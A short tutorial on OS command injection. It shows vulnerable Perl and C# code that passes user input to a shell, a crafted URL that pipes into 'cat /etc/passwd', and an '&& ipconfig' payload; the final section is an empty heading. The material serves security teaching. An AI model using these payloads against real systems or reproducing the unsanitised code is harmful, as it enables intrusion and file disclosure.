# Attacking Back-End Components

- [Attacking Back-End Components](#attacking-back-end-components)
  - [Injecting OS Commands](#injecting-os-commands)
    - [Injecting Via Perl](#injecting-via-perl)
    - [Injecting Via ASP](#injecting-via-asp)
    - [Injecting Through Dynamic Execution](#injecting-through-dynamic-execution)

## Injecting OS Commands

Many web servers now use APIs to interact with the underlying server OS. Thus if you can access an API that interacts with the system, you may execute commands.

### Injecting Via Perl

Imagine this Perl script for telling disk usage:

    #!/usr/bin/perl
    use strict;
    use CGI qw(:standard escapeHTML);
    print header, start_html(“”);
    print “<pre>”;
    
    my $command = “du -h --exclude php* /var/www/html”;
    $command= $command.param(“dir”);
    $command=`$command`;
    print “$command\n”;
    
    print end_html;

This script can be exploited thought the user of a pipe "```|```".

    Original URL:
    https://example.com/cgi-bin/foo.cgi?dir=/public

    Crafted Exploit:
    https://example.com/cgi-bin/foo.cgi?dir=/public|%20cat%20/etc/passwd

This crafted URL will return the ```/etc/passwd``` file contents.

### Injecting Via ASP

Given this C# code:

    string dirName = “C:\\filestore\\” + Directory.Text;
    ProcessStartInfo psInfo = new ProcessStartInfo(“cmd”, “/c dir “ +
    dirName);
    ...
    Process proc = Process.Start(psInfo);

This is for administrators to view the contents of a requested directory. The intended use of this script is for the user to supply the ```Directory``` paramter into the preset command, execute the command, and display the results.

As with the Perl script, the code is vulnerable to shell metacharacters. In this case that is ```&```, which allows for batching commands together. So to exploit this, just input

    && ipconfig

Into the prompt and it will execute.

### Injecting Through Dynamic Execution

